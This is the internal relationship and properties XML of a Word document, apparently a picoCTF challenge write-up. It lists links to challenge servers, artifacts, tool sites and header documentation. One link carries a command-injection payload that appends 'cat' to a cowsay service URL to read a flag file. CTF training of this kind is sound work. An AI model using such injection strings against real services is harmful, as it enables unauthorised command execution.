Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:11590/" TargetMode="External"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.png"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent" TargetMode="External"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image66.png"/><Relationship Id="rId171" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image76.png"/><Relationship Id="rId192" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://kb.offsec.nl/tools/forensics/stegsolve/" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/level5.flag.txt.enc" TargetMode="External"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="view-source:http://mercury.picoctf.net:25395/index.phps" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:17781/" TargetMode="External"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:44070/" TargetMode="External"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/PoCInnovation/ReblochonWriteups/tree/master/PicoCTF2021" TargetMode="External"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.png"/><Relationship Id="rId161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.base64decode.org/" TargetMode="External"/><Relationship Id="rId182" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image83.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blogs.nvcc.edu/kdinh/ctftools/" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/51/level1.flag.txt.enc" TargetMode="External"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.mathstat.dal.ca/~selinger/md5collision/" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:41511" TargetMode="External"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image31.png"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image67.png"/><Relationship Id="rId172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:58112" TargetMode="External"/><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hyperlink" Target="http://mercury.picoctf.net:10868/" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/level5.hash.bin"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hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/36474/" TargetMode="External"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image36.png"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:13594" TargetMode="External"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.mathstat.dal.ca/~selinger/md5collision/" TargetMode="External"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image51.png"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/33850/" TargetMode="External"/><Relationship Id="rId146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/54253/" TargetMode="External"/><Relationship Id="rId167" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId188" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/XML" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://resources.infosecinstitute.com/topic/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/" TargetMode="External"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/37821/" TargetMode="External"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image34.png"/><Relationship Id="rId162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:51108/js/myfile.txt" TargetMode="External"/><Relationship Id="rId183"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hyperlink" Target="https://artifacts.picoctf.net/c/60/level4.py" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/17/level2.py" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/c594d8d915de0129d92b4c41e25a2313/lyrics.txt" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/b99c57e4274172bf3c93534b6d59632d/lyrics.txt" TargetMode="External"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:49386/" TargetMode="External"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer" TargetMode="External"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Homomorphic_encryption" TargetMode="External"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image45.png"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:63504/" TargetMode="External"/><Relationship Id="rId157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:38541/index.html" TargetMode="External"/><Relationship Id="rId178" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image81.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.png"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image29.png"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:55336/index.html" TargetMode="External"/><Relationship Id="rId173" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><Relationship Id="rId194" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/30/convertme.py" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/60/level4.flag.txt.enc" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/dictionary.txt" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.png"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:36474" TargetMode="External"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/a6d9cac3bfa4935ceb50c145d3ff5586/keygenme-trial.py" TargetMode="External"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.png"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image52.png"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image63.png"/><Relationship Id="rId168" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image75.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://gchq.github.io/CyberChef/" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:21939/" TargetMode="External"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image26.png"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For" TargetMode="External"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/51d68e61bb41207a55f24e753f07c5a3/values" TargetMode="External"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image59.png"/><Relationship Id="rId163" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image71.png"/><Relationship Id="rId184" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/XML" TargetMode="External"/><Relationship Id="rId189" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/zardus/ctf-tools" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/17/level2.flag.txt.enc" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:50761/" TargetMode="External"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image46.png"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:63504/filter.php" TargetMode="External"/><Relationship Id="rId158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:51108/" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/38/fixme1.py" TargetMode="Externa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hyperlink" Target="http://mercury.picoctf.net:1270/" TargetMode="External"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.png"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image41.png"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image68.png"/><Relationship Id="rId174" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image78.png"/><Relationship Id="rId179" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/4fe0f4357f7458c6892af394426eab55/tftp.pcapng" TargetMode="External"/><Relationship Id="rId190" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://kb.offsec.nl/tools/" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/5bd86036f013ac3b9c958499adf3e2e2/strings" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/86/runme.py" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.png"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.png"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:5428/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/60/level4.hash.bin" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:44070/" TargetMode="External"/><Relationship Id="rId78"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hyperlink" Target="https://mercury.picoctf.net/static/fd0e358d4b82695c220c0d6013c11484/crackme.py" TargetMode="External"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/5ef2e9103d55972d975437f68175b9ab/dolls.jpg" TargetMode="External"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image49.png"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image60.png"/><Relationship Id="rId148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image64.png"/><Relationship Id="rId164" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:50167/" TargetMode="External"/><Relationship Id="rId169" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:53735/" TargetMode="External"/><Relationship Id="rId185" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Vector_image_format"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github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Trivial%20Flag%20Transfer%20Protocol/Trivial%20Flag%20Transfer%20Protocol.md" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/24/level3.py" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image24.png"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Date" TargetMode="External"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image42.png"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://onlinephp.io/" TargetMode="External"/><Relationship Id="rId154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:61778/index.html" TargetMode="External"/><Relationship Id="rId175" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hexed.it/" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/495d43ee4a2b9f345a4307d053b4d88d/file" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/94/serpentine.py" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.png"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://factordb.com/" TargetMode="External"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:49699/" TargetMode="External"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image61.png"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId165" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image72.png"/><Relationship Id="rId186" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Two-dimensional" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/24/level3.flag.txt.enc" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:21939/" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.png"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image43.png"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js" TargetMode="External"/><Relationship Id="rId155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image69.png"/><Relationship Id="rId176" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image79.png"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/101/code.py" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/551/files.zip" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.png"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/13594/" TargetMode="External"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image50.png"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:59300/" TargetMode="External"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/DNT" TargetMode="External"/><Relationship Id="rId145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image62.png"/><Relationship Id="rId166" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image73.png"/><Relationship Id="rId187" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Vector_graphics" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/24/level3.hash.bin" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image44.png"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.png"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://caas.mars.picoctf.net/cowsay/hellow;%20cat%20falg.txt" TargetMode="External"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:19593/filter.php" TargetMode="External"/><Relationship Id="rId156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image70.png"/><Relationship Id="rId177" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image80.png"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/101/codebook.txt" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/554/big-zip-files.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1916</TotalTime>
  <Pages>106</Pages>
  <Words>11574</Words>
  <Characters>65978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Jun Wang</cp:lastModifiedBy>
  <cp:revision>49</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-08-26T09:47:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-09-01T05:57:00Z</dcterms:modified>
  <dc:language>en-US</dc:language>
</cp:coreProperties>
</file>